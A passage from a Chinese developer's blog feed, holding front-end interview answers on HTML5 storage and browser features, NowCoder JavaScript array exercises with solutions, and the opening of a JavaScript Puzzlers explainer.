rel="external">有趣的HTML5：离线存储</a></p><blockquote><p>十、 浏览器是怎么对HTML5的离线储存资源进行管理和加载的呢</p></blockquote><p>在线的情况下，浏览器发现 <code>html</code> 头部有 <code>manifest</code> 属性，它会请求 <code>manifest</code> 文件，如果是第一次访问 <code>app</code> ，那么浏览器就会根据 <code>manifest</code> 文件的内容下载相应的资源并且进行离线存储。如果已经访问过 <code>app</code> 并且资源已经离线存储了，那么浏览器就会使用离线的资源加载页面，然后浏览器会对比新的 <code>manifest</code> 文件与旧的 <code>manifest</code> 文件，如果文件没有发生改变，就不做任何操作，如果文件改变了，那么就会重新下载文件中的资源并进行离线存储。<br>离线的情况下，浏览器就直接使用离线存储的资源。<br><a href="https://segmentfault.com/a/1190000000732617" target="_blank" rel="external">有趣的HTML5：离线存储</a></p><blockquote><p>十一、 请描述一下 cookies，sessionStorage 和 localStorage 的区别？</p></blockquote><p>cookie是网站为了标示用户身份而储存在用户本地终端（Client Side）上的数据（通常经过加密）。<br>cookie数据始终在同源的http请求中携带（即使不需要），记会在浏览器和服务器间来回传递。<br>sessionStorage和localStorage不会自动把数据发给服务器，仅在本地保存。</p><p>存储大小：<br>cookie数据大小不能超过4k。<br>sessionStorage和localStorage 虽然也有存储大小的限制，但比cookie大得多，可以达到5M或更大。</p><p>有期时间：<br>localStorage    存储持久数据，浏览器关闭后数据不丢失除非主动删除数据；<br>sessionStorage  数据在当前浏览器窗口关闭后自动删除。<br>cookie          设置的cookie过期时间之前一直有效，即使窗口或浏览器关闭</p><blockquote><p>十二、iframe有那些缺点？</p></blockquote><p>（1）、<code>iframe</code>会阻塞主页面的<code>Onload</code>事件；<br>搜索引擎的检索程序无法解读这种页面，不利于SEO;</p><p>（2）、<code>iframe</code>和主页面共享连接池，而浏览器对相同域的连接有限制，所以会影响页面的并行加载。</p><p>使用 <code>iframe</code> 之前需要考虑这两个缺点。如果需要使用<code>iframe</code>，最好是通过javascript<br>动态给 <code>iframe</code> 添加 <code>src</code> 属性值，这样可以绕开以上两个问题。</p><blockquote><p>十三、 Label的作用是什么？是怎么用的？</p></blockquote><p><code>label</code>标签来定义表单控制间的关系,当用户选择该标签时，浏览器会自动将焦点转到和标签相关的表单控件上。<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;<span class="keyword">label</span> <span class="keyword">for</span>=<span class="string">"Name"</span>&gt;Number:&lt;/<span class="keyword">label</span>&gt;</div><div class="line">&lt;<span class="keyword">input</span> <span class="keyword">type</span>=“text“name=<span class="string">"Name"</span> id=<span class="string">"Name"</span>/&gt;</div><div class="line"></div><div class="line">&lt;<span class="keyword">label</span>&gt;Date:&lt;<span class="keyword">input</span> <span class="keyword">type</span>=<span class="string">"text"</span> name=<span class="string">"B"</span>/&gt;&lt;/<span class="keyword">label</span>&gt;</div></pre></td></tr></table></figure></p><blockquote><p>(阿里)十四、如何实现浏览器内多个标签页之间的通信? </p></blockquote><p><code>WebSocket</code>、<code>SharedWorker</code>；<br>也可以调用 <code>localstorge</code>、 <code>cookies</code> 等本地存储方式；</p><p><code>localstorge</code> 另一个浏览上下文里被添加、修改或删除时，它都会触发一个事件，<br>我们通过监听事件，控制它的值来进行页面信息通信；<br>注意 <code>quirks：Safari</code> 在无痕模式下设置 <code>localstorge</code> 值时会抛出 <code>QuotaExceededError</code> 的异常；</p><blockquote><p>十五、HTML5的form如何关闭自动完成功能？</p></blockquote><p>给不想要提示的 <code>form</code> 或某个 <code>input</code> 设置为 <code>autocomplete=off</code>。</p><blockquote><p>(阿里)十六webSocket如何兼容低浏览器？</p></blockquote><p>  Adobe Flash Socket 、<br>  ActiveX HTMLFile (IE) 、<br>  基于 multipart 编码发送 XHR 、<br>  基于长轮询的 XHR</p><blockquote><p>十七、页面可见性（Page Visibility API） 可以有哪些用途？</p></blockquote><p>通过 visibilityState 的值检测页面当前是否可见，以及打开网页的时间等;<br>在页面被切换到其他后台进程的时候，自动暂停音乐或视频的播放；</p><blockquote><p>十八、如何在页面上实现一个圆形的可点击区域？</p></blockquote><p>（1）、<code>map+area</code> 或者 <code>svg</code><br>（2）、<code>border-radius</code><br>（3）、纯js实现 需要求一个点在不在圆上简单算法、获取鼠标坐标等等</p><blockquote><p>十九、实现不使用 border 画出1px高的线，在不同浏览器的标准模式与怪异模式下都能保持一致的效果。</p></blockquote><p>  <code>&lt;div style=&quot;height:1px;overflow:hidden;background:red&quot;&gt;&lt;/div&gt;</code></p><blockquote><p>二十、 网页验证码是干嘛的，是为了解决什么安全问题。</p></blockquote><p>区分用户是计算机还是人的公共全自动程序。可以防止恶意破解密码、刷票、论坛灌水；<br>有效防止黑客对某一个特定注册用户用特定程序暴力破解方式进行不断的登陆尝试。</p><blockquote><p>二十一、<code>title</code> 与 <code>h1</code> 的区别、 <code>b</code> 与 <code>strong</code> 的区别、<code>i</code> 与 <code>em</code> 的区别？</p></blockquote><p><code>title</code> 属性没有明确意义只表示是个标题，<code>h1</code> 则表示层次明确的标题，对页面信息的抓取也有很大的影响；</p><p><code>strong</code> 是标明重点内容，有语气加强的含义，使用阅读设备阅读网络时：<code>&lt;strong&gt;</code>会重读，而<code>&lt;b&gt;</code>是展示强调内容。</p><p><code>i</code> 内容展示为斜体，<code>em</code> 表示强调的文本；</p><p>Physical Style Elements – 自然样式标签 ： <code>b, i, u, s, pre</code><br>Semantic Style Elements – 语义样式标签 ： <code>strong, em, ins, del, code</code><br>应该准确使用语义样式标签, 但不能滥用, 如果不能确定时首选使用自然样式标签。</p><blockquote><p>（方方）二十二、meta viewport 是做什么用的，怎么写？</p></blockquote><p>控制页面在移动端不要缩小显示。<br><code>&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0&quot;&gt;</code></p><blockquote><p>（方方）二十三、canvas 元素是干什么的？</p></blockquote><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Canvas_API" target="_blank" rel="external">Canvas 入门手册</a></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;一、Doctype作用？标准模式与兼容模式各有什么区别?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;（1）、&lt;code&gt;&amp;lt;!DOCTYPE&amp;gt;&lt;/code&gt;声明位于 &lt;code&gt;HTML&lt;/code&gt; 文档中的第一行，处于&lt;code&gt;&amp;lt;html&amp;gt;&lt;/code&gt; 标签之前。告知浏览器的解析器用什么文档标准解析这个文档。 &lt;code&gt;DOCTYPE&lt;/code&gt; 不存在或格式不正确会导致文档以兼容模式呈现。&lt;/p&gt;
&lt;p&gt;（2）、标准模式的排版 和JS运作模式都是以该浏览器支持的最高标准运行。在兼容模式中，页面以宽松的向后兼容的方式显示,模拟老式浏览器的行为以防止站点无法工作。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>JavaScript 能力测试</title>
    <link href="wangsiyuan233.github.io/2018/06/27/56JS%E8%83%BD%E5%8A%9B%E6%B5%8B%E8%AF%95/"/>
    <id>wangsiyuan233.github.io/2018/06/27/56JS能力测试/</id>
    <published>2018-06-27T08:13:44.000Z</published>
    <updated>2018-07-03T23:23:57.849Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.nowcoder.com/ta/js-assessment?query=&amp;asc=true&amp;order=&amp;page=2" target="_blank" rel="external">[牛客原题]</a> || <a href="https://github.com/wangsiyuan233/NowCoder/blob/master/JS%E8%83%BD%E5%8A%9B%E6%B5%8B%E8%AF%84.js" target="_blank" rel="external">[我的源码]</a></p><blockquote><p>一、数组篇</p></blockquote><p>（也就数组篇值得总结，剩下的都是些啥）</p><p><strong>1、 增加元素</strong><br>1.1 头部增加<br><figure class="highlight ada"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">function</span> <span class="title">prepend</span>(arr, item)&#123;</div><div class="line">  <span class="keyword">return</span> <span class="type">[item].concat(arr)</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>1.2 尾部增加<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> append2 = <span class="function"><span class="keyword">function</span>(<span class="params">arr, item</span>)</span>&#123;</div><div class="line"><span class="comment">// slice(start, end)浅拷贝数组</span></div><div class="line">    <span class="keyword">var</span> a = arr.slice(<span class="number">0</span>); </div><div class="line">    a.push(item);</div><div class="line">    <span class="keyword">return</span> a;</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> append3 = <span class="function"><span class="keyword">function</span>(<span class="params">arr, item</span>)</span>&#123;</div><div class="line">    <span class="keyword">return</span> arr.concat(item);</div><div class="line">&#125;;</div></pre></td></tr></table></figure><p>1.3 数组合并<br><figure class="highlight ada"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">function</span> <span class="title">concat</span>(arr1, arr2)&#123;</div><div class="line">    <span class="keyword">return</span> <span class="type">arr1.concat(arr2)</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>1.4 指定位置添加<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">insert</span>(<span class="params">arr, item, index</span>)</span>&#123;</div><div class="line"><span class="comment">//复制数组</span></div><div class="line">  <span class="keyword">var</span> a = arr.slice(<span class="number">0</span>);</div><div class="line"><span class="comment">// splice(数组开始的下标，替换/删除的长度，替换的值)</span></div><div class="line">  a.splice(index, <span class="number">0</span>, item);</div><div class="line">  <span class="keyword">return</span> a;</div><div class="line"> &#125;</div></pre></td></tr></table></figure></p><a id="more"></a><p><strong>2、 删除元素</strong><br>2.1 头部删除<br><figure class="highlight ada"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">function</span> <span class="title">curtail</span>(arr) &#123;</div><div class="line">  <span class="keyword">return</span> <span class="type">arr.slice(1)</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>2.2 尾部删除<br><figure class="highlight matlab"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">truncate</span><span class="params">(arr)</span>&#123;</span></div><div class="line">  <span class="keyword">return</span> arr.filter(<span class="function"><span class="keyword">function</span><span class="params">(v,i,arr)</span>&#123;</span></div><div class="line">    <span class="keyword">return</span> <span class="built_in">i</span> !== arr.<span class="built_in">length</span> <span class="number">-1</span></div><div class="line">  &#125;);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">truncate</span><span class="params">(arr)</span><span class="comment">&#123;</span></span></div><div class="line">  var a=[];</div><div class="line">  [].push.apply(a, arr);</div><div class="line">  a.pop();</div><div class="line">  return a;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>2.3 删除重复<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">remove</span>(<span class="params">arr,item</span>)</span>&#123;</div><div class="line">  <span class="comment">//声明一个新数组保存结果</span></div><div class="line">  <span class="keyword">var</span> a = [];</div><div class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arr.length; i++)&#123;</div><div class="line">    <span class="keyword">if</span>(arr[i] != item)&#123;</div><div class="line">      a.push(arr[i]);</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> a;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><strong>3、 查找元素</strong><br>3.1 列出重复的元素<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">duplicates</span>(<span class="params">arr</span>)</span>&#123;</div><div class="line"><span class="comment">//声明两个数组，a数组用来存放结果，b数组用来存放arr中每个元素的个数</span></div><div class="line">  <span class="keyword">var</span> a = [],b = [];</div><div class="line"><span class="comment">//遍历arr，如果以arr中元素为下标的的b元素已存在，则该b元素加1，否则设置为1</span></div><div class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arr.length; i++)&#123;</div><div class="line">    <span class="keyword">if</span>(!b[arr[i]])&#123;</div><div class="line">      b[arr[i]] = <span class="number">1</span>;</div><div class="line">      <span class="keyword">continue</span>;</div><div class="line">    &#125;</div><div class="line">    b[arr[i]]++;</div><div class="line">  &#125;</div><div class="line"><span class="comment">//遍历b数组，将其中元素值大于1的元素下标存入a数组中</span></div><div class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; b.length; i++)&#123;</div><div class="line">    <span class="keyword">if</span>(b[i] &gt; <span class="number">1</span>)&#123;</div><div class="line">      a.push(i);</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> a;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>3.2 统计重复的次数<br><figure class="highlight fortran"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span></span> <span class="built_in">count</span>(arr, item)&#123;</div><div class="line">  var <span class="built_in">count</span> = <span class="number">0</span>;</div><div class="line">  arr.forEach(<span class="function"><span class="keyword">function</span><span class="params">(e)</span></span>&#123;</div><div class="line">//e为arr中的每一个元素，与 item 相等则<span class="built_in">count</span>+<span class="number">1</span></div><div class="line">    e == item ? <span class="built_in">count</span>++ : <span class="number">0</span>;</div><div class="line">  &#125;);</div><div class="line">  <span class="keyword">return</span> <span class="built_in">count</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>3.3 统计相同元素的位置<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">indexOf</span>(<span class="params">arr, item</span>)</span>&#123;</div><div class="line">  <span class="comment">//判断是否支持indexOf方法</span></div><div class="line">  <span class="keyword">if</span>(<span class="built_in">Array</span>.prototype.indexOf)&#123;</div><div class="line">      <span class="keyword">return</span> arr.indexOf(item);</div><div class="line">  &#125;<span class="keyword">else</span>&#123;</div><div class="line">      <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arr.length; i++)&#123;</div><div class="line">          <span class="keyword">if</span>(arr[i] === item)&#123;</div><div class="line">              <span class="keyword">return</span> i;</div><div class="line">          &#125;</div><div class="line">      &#125;</div><div class="line">  &#125;     </div><div class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">findAllOccurrences</span><span class="params">(arr,target)</span></span>&#123;</div><div class="line">  <span class="keyword">var</span> temp = [];</div><div class="line">  arr.<span class="keyword">forEach</span>(<span class="function"><span class="keyword">function</span><span class="params">(val,index)</span></span>&#123;</div><div class="line">  <span class="comment">// 如果前者为真，后者就不用执行了</span></div><div class="line">    <span class="comment">// 如果对比值不相等，就返回一个空数组</span></div><div class="line">    <span class="comment">//如果对比值相等，就把 index 添加的 空数组里</span></div><div class="line">    val !== target || temp.push(index);</div><div class="line">  &#125;);</div><div class="line">  <span class="keyword">return</span> temp;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><strong>4、 运算</strong><br>4.1 求和<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">sum</span>(<span class="params">arr</span>) </span>&#123;</div><div class="line">  <span class="keyword">return</span> <span class="built_in">eval</span>(arr.join(<span class="string">"+"</span>));</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p><p>4.2 平方<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">square</span>(<span class="params">arr</span>)</span>&#123;</div><div class="line">  <span class="keyword">return</span> arr.map(<span class="function"><span class="keyword">function</span>(<span class="params">item,index,array</span>)</span>&#123;</div><div class="line">    <span class="keyword">return</span> item*item;</div><div class="line">  &#125;)</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://www.nowcoder.com/ta/js-assessment?query=&amp;amp;asc=true&amp;amp;order=&amp;amp;page=2&quot;&gt;[牛客原题]&lt;/a&gt; || &lt;a href=&quot;https://github.com/wangsiyuan233/NowCoder/blob/master/JS%E8%83%BD%E5%8A%9B%E6%B5%8B%E8%AF%84.js&quot;&gt;[我的源码]&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;一、数组篇&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;（也就数组篇值得总结，剩下的都是些啥）&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1、 增加元素&lt;/strong&gt;&lt;br&gt;1.1 头部增加&lt;br&gt;&lt;figure class=&quot;highlight ada&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;prepend&lt;/span&gt;(arr, item)&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;type&quot;&gt;[item].concat(arr)&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;1.2 尾部增加&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; append2 = &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;arr, item&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// slice(start, end)浅拷贝数组&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; a = arr.slice(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;); &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    a.push(item);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; a;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; append3 = &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;arr, item&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; arr.concat(item);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;1.3 数组合并&lt;br&gt;&lt;figure class=&quot;highlight ada&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;concat&lt;/span&gt;(arr1, arr2)&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;type&quot;&gt;arr1.concat(arr2)&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;1.4 指定位置添加&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;insert&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;arr, item, index&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//复制数组&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; a = arr.slice(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// splice(数组开始的下标，替换/删除的长度，替换的值)&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  a.splice(index, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, item);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; a;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; &amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>JavaScript Puzzlers!</title>
    <link href="wangsiyuan233.github.io/2018/06/20/55JavaScript-Puzzlers/"/>
    <id>wangsiyuan233.github.io/2018/06/20/55JavaScript-Puzzlers/</id>
    <published>2018-06-20T09:18:23.000Z</published>
    <updated>2018-06-23T03:35:45.399Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一"><a href="#一" class="headerlink" title="一"></a>一</h2><figure class="highlight arduino"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[<span class="string">"1"</span>, <span class="string">"2"</span>, <span class="string">"3"</span>].<span class="built_in">map</span>(<span class="built_in">parseInt</span>)</div></pre></td></tr></table></figure><p><strong>Hint: </strong><br>1、这里的 <code>map</code> 不是“地图”的意思，而是指“映射”，<code>[].map()</code>返回一个新的数组；<code>map()</code>有三个参数。<br>2、<code>parseInt()</code> 解析一个字符串，并返回一个整数； <code>parseInt()</code> 有两个参数。<br>  <code>parseInt(&quot;11&quot;,2);        //返回 3 (2+1)</code><br>答案：<code>[1, NaN, NaN]</code><br><a id="more"></a></p><h2 id="二"><a href="#二" class="headerlink" title="二"></a>二</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[<span class="keyword">typeof</span> <span class="literal">null</span>, <span class="literal">null</span> <span class="keyword">instanceof</span> <span class="built_in">Object</span>]</div></pre></td></tr></table></figure><p><strong>Hint：</strong><br>1、<code>null</code>代表空对象指针，所以<code>typeof</code>判断成一个对象。可以说JS设计上的一个BUG<br>2、<code>instanceof</code> 实际上判断的是对象上构造函数，<code>null</code>是空当然不可能有构造函数<br>3、对于不可调用的对象， <code>typeof</code> 都返回 <code>“Object”</code><br>答案：<code>[&quot;object&quot;, false]</code></p><h2 id="三"><a href="#三" class="headerlink" title="三"></a>三</h2><figure class="highlight json"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[ [<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>].reduce(Math.pow), [].reduce(Math.pow) ]</div></pre></td></tr></table></figure><p><strong>Hint：</strong><br>1、<code>reduce</code> 前面不能是空的<br>2、<code>Math.pow(x,y)</code> 函数返回基数（x）的指数（y）次幂<br><code>console.log([3,2,1].reduce(Math.pow))</code> // 返回 9<br>3、<code>reduce()</code> 专为累加操作而设计<br>答案：an error</p><h2 id="四"><a href="#四" class="headerlink" title="四"></a>四</h2><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> <span class="keyword">val</span> = <span class="string">'smtg'</span>;</div><div class="line">console.log(<span class="string">'Value is '</span> + (<span class="keyword">val</span> === <span class="string">'smtg'</span>) ? <span class="string">'Something'</span> : <span class="string">'Nothing'</span>);</div></pre></td></tr></table></figure><p><strong>Hint：</strong><br>1、 加号（<code>+</code>）比三元运算符（<code>？：</code>）优先级别更高一些<br>2、 原题等价于 <code>&#39;Value is true&#39; ? &#39;Somthing&#39; : &#39;Nonthing&#39;</code><br>答案：<code>Something</code></p><h2 id="五"><a href="#五" class="headerlink" title="五"></a>五</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div 